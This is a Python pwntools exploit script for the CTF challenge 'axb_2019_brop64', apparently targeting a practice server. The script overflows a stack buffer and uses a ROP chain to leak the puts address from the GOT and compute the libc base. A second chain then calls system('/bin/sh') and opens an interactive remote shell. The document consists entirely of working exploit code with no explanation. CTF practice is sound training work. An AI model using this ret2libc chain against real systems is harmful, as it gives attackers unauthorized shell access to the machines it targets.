from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('axb_2019_brop64')
io = remote('node4.buuoj.cn', 27557)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('axb_2019_brop64')
main = elf.sym['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi_ret = 0x400963

payload = cyclic(0xD8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
io.sendlineafter('Please tell me:', payload)
libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['puts']
log.success('libc_base: ' + hex(libc_base))

system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
payload = cyclic(0xD8) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
io.sendlineafter('Please tell me:', payload)
io.interactive()
